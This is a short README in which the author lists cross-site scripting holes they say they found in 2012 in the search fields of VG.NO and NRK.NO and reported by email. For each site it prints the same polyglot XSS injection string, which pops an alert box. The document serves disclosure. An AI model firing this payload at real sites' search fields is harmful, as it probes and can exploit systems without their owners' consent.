# XSS-Vulnerability-List
List of websites that I have found Cross Site Scripting vulnerabilities over the years, 
which includes URLs of well known websites/brands. Considering the fact that most of
these vulnerabilities were found many years ago, I do not have a POC (Proof of Concept)
images for all of my discoveries. However, I do have records of emails I have sent and
exchanged with people involved with nearly all of the websites being listed below.
In other words, they should be able to confirm this, as the mail is probably logged
both in their system, while I also have a copy.

## VG.NO
I found this vulnerability back in 2012, where it was possible to inject HTML in their
search field on pretty much every website they had that allowed for a standard search.

Dork: 
```
;alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

POC: (Will be updated).

## NRK.NO
This vulnerability was also found back in 2012, and was also through the search field
on the website, including other sub-domains.

Dork: 
```
;alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

POC: (Will be updated).
